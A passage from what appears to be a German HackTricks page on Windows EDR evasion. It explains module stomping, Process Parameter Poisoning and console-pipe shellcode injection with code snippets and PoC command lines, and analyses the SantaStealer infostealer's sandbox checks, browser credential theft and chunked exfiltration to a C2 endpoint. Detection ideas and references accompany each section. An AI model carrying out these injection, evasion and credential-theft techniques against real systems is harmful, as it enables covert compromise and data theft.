- Speichern Sie den Kettenzustand auf dem Heap statt auf dem Stack des Helper-Threads, um ein Erschöpfen des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwenden Sie `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Halten Sie den Hauptthread an, bevor Sie den TIB/Context wiederherstellen (`NtSuspendThread` → Wiederherstellung → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Helper-Thread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- Auf `NtQueryInformationThread` folgende direkte Schreibzugriffe in die Stack-Grenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Ketten, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Section-Berechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Bereich einer DLL aus, die bereits in den Zielprozess gemappt ist**, statt offensichtlichen privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess noch benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gegen häufige Module wie `uxtheme.dll` oder `comctl32.dll` ist anfällig: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich bringt den Prozess zum Absturz. Ein zuverlässigerer Ablauf:

1. Enumerieren Sie die Module des Zielprozesses und behalten Sie eine **Include-Liste mit nur den Namen** bereits geladener DLLs.
2. Erstellen Sie zuerst die Payload und erfassen Sie ihre **exakte Byte-Größe**.
3. Durchsuchen Sie Kandidaten-DLLs auf der Festplatte und vergleichen Sie die PE-Section **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da dieser Wert die Größe des ausführbaren Bereichs **im gemappten Speicher** widerspiegelt.
4. Parsen Sie die **Export Address Table (EAT)** und wählen Sie eine RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechnen Sie den **Blast Radius**: Wenn die Payload die ausgewählte Funktionsgrenze überschreitet, überschreibt sie benachbarte Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Betriebshinweise
- Bevorzugt bereits im Remote-Prozess geladene DLLs, um die Telemetrie von `LoadLibrary` und unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzugt Exports, die von der Zielanwendung nur selten ausgeführt werden. Andernfalls können normale Codepfade die überschriebenen Bytes vor oder nach der Thread-Erstellung erreichen.
- Bei großen Implantaten muss das Einbetten des Shellcodes häufig von einem Stringliteral auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der vollständige Puffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsmöglichkeiten
- Remote-Schreibvorgänge in ausführbare, durch Images hinterlegte Seiten (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufiger verwendeten privaten RWX-/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich verändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)`- und `WriteProcessMemory`-Aufrufen auf DLL-`.text`-Seiten, gefolgt von einer Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Kindprozess kopiert** und in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierte vergiftbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** verweisen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Zeichenfolgen sein, der mit einem zusätzlichen `\0` abgeschlossen wird.
- `lpReserved` ist offiziell reserviert. Daher sollte die Zuordnung zu `ShellInfo` als Implementierungsdetail und nicht als stabile, dokumentierte Zusicherung betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Mechanismus**. Der Operator erstellt den Kindprozess mit vom Angreifer kontrollierten Startdaten und lässt Windows die prozessübergreifende Kopie durchführen.

### Remote-Suchablauf ohne Remote-Schreib-APIs

Nach der Erstellung des Kindprozesses wird der kopierte Puffer mit **schreibgeschützten** Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Zeiger verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW` und nicht ausführbar. Eine gängige P3-Kette sieht so aus:

1. Den Prozess normal erstellen (nicht im angehaltenen Zustand)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Anders als bei klassischen Thread-Hijacking-Abläufen sind `SuspendThread` / `ResumeThread` **nicht erforderlich**; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs umgangen, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- oft auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Nullbytes und gestaffelter Shellcode

Alle drei Träger sind **Strings oder stringähnliche Daten**. Daher wird eine rohe Payload mit `0x00` bei der Übertragung abgeschnitten. Eine praktikable Lösung ist eine **nullbytefreie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Damit kann die erste Stufe Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stackbasierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Stack des Ziels pushen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Eine zweite Stufe kann dann vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` in `PAGE_EXECUTE_READ` geändert und angesprungen werden, wodurch eine direkte RWX-Allokation vermieden wird.

### Erkennungsideen

Gute Möglichkeiten zur Suche, die von den Autoren genannt wurden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, wenn damit **Prozessparameter-Seiten ausführbar** gemacht werden
- auf diese Änderung der Schutzattribute folgend `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder entropiereiche Werte für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Übertragungstrick**, aber für sich allein keine vollständige Ausführungsprimitive: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigungen und eine Methode zur Umleitung der Ausführung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, da intern verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` zum Einsatz kommen.

## Console-STDIN-Pipe-Injection

Ein interaktiver Konsolenprozess kann ebenfalls als **Payload-Übertragungsprimitive** dienen. Der Injector leitet die Standardeingabe des untergeordneten Prozesses auf eine Pipe um und sendet eine Markierung, gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher gelesen hat, sucht der Injector diesen Puffer, macht ihn ausführbar und leitet einen Thread des untergeordneten Prozesses dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden, es handelt sich jedoch weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „Named Pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, aber der PoC wählt weder einen `\\.\pipe\<name>`-Pfad aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem Standardsicherheitsdeskriptor, setzt das Lese-Handle in `STARTUPINFO.hStdInput`, setzt `STARTF_USESTDHANDLES` und startet mit aktivierter Handle-Vererbung einen neuen untergeordneten Prozess. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet seine Pipe nicht mit einem bereits laufenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenz-Workflow

Die Implementierung verwendet die folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des untergeordneten Prozesses erstellen. Die Vererbung für die beiden Handles auf der Elternseite deaktivieren und nach der Prozesserstellung die Duplikate auf der Seite des untergeordneten Prozesses im Elternprozess schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Der untergeordnete Prozess erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf der Elternseite senden. Das Konsolenprogramm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten, committeten Speicherbereiche.
4. Den Adressraum des untergeordneten Prozesses mit `VirtualQueryEx` durchlaufen, mögliche `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` auslesen und nach der Markierung am Anfang von `rawData` suchen.
5. Den gefundenen Puffer mit `VirtualProtectEx` in `PAGE_EXECUTE_READWRITE` ändern.
6. Den Hauptthread identifizieren, anhalten, mit `NtSetContextThread` `RIP` auf `found_address + 0x19` setzen und ihn fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und ihr eingebetteter Payload besteht aus x64-Shellcode. `rawData` beginnt mit einem 25 Byte langen Marker; ausführbare Bytes beginnen daher am hexadezimalen Offset `0x19`. Achten Sie beim Ersetzen des Payloads darauf, dieses Layout beizubehalten, oder aktualisieren Sie Marker, Suchvektor, Array-Größe und Ausführungs-Offset gemeinsam. In den Quellkommentaren sind außerdem `0x0A`, `0x0D` und `0x1A` als problematische Zeichen aufgeführt. Dieser Workflow verändert weder das Token noch die Berechtigungen des untergeordneten Prozesses.<sup>[[41]](#references)</sup>

Kleine native Hilfsprogramme und Muster für die Payload-Kompilierung finden Sie unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer-Taktiken für filelose Umgehung und Diebstahl von Zugangsdaten

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV-Umgehung, Anti-Analyse und den Zugriff auf Zugangsdaten in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Prüfung des Tastaturlayouts und Sandbox-Verzögerung

- Ein Konfigurationsflag (`anti_cis`) zählt mit `GetKeyboardLayoutList` die installierten Tastaturlayouts auf. Wird ein kyrillisches Layout gefunden, erstellt das Sample eine leere `CIS`-Markierungsdatei und beendet sich, bevor es Stealer ausführt. So wird sichergestellt, dass es in ausgeschlossenen Regionen nicht aktiv wird, während ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Verschachtelte `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklisten für Debugger/Sandboxes. Anschließend berechnet sie die Prüfsumme erneut für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl von Prozessen, kürzliche Systemlaufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Guest Additions zu erkennen, und führt Timing-Prüfungen rund um Wartezeiten durch, um einzelne Schritte zu erkennen. Bei jedem Treffer wird abgebrochen, bevor Module gestartet werden.

### Dateiloser Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf der Festplatte abgelegt oder manuell in den Speicher gemappt wird. Im dateilosen Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite DLL-Stufe, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel und zwei 12-Byte-Nonces). Nach beiden Entschlüsselungsschritten lädt er den Blob reflectiv (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) stammen.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit Direct Syscalls, um Code in einen laufenden Chromium-Browser einzuschleusen, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten direkt aus SQLite-Datenbanken zu entschlüsseln – trotz der ABE-Härtung.

### Modulare In-Memory-Erfassung & HTTP-Exfiltration in Chunks

- `create_memory_based_log` durchläuft eine globale Tabelle mit Funktionszeigern namens `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet nach einer Join-Wartezeit von etwa 45 Sekunden die Anzahl seiner Dateien.
- Anschließend wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv in 10-MB-Chunks per HTTP-POST an `http://<C2>:6767/upload`. Dabei wird eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`. Im letzten Chunk wird `complete: true` angefügt, damit der C2 weiß, dass die Rekonstruktion abgeschlossen ist.

## References

- [1] [Fortgeschrittene Evasion-Techniken: Präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call Stacks: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC für Call-Stack-Spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollten Sie Ihrem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in frühere Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit dem Schutz eines Protected Process Light (PPL) entgegenwirken](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing abwehren](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Schlafende Schönheit: Adaptix mit Crystal Palace zur Ruhe bringen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftung von Prozessparametern](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Schlafende Schönheit II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Missbrauch von Chrome Remote Desktop bei Red-Team-Operationen: ein Praxisleitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Den Remediation Driver von Defender als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSecs Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Mit LLVM selbstmaskierende Funktionen erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Einen untergeordneten Prozess mit umgeleiteter Eingabe und Ausgabe erstellen](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
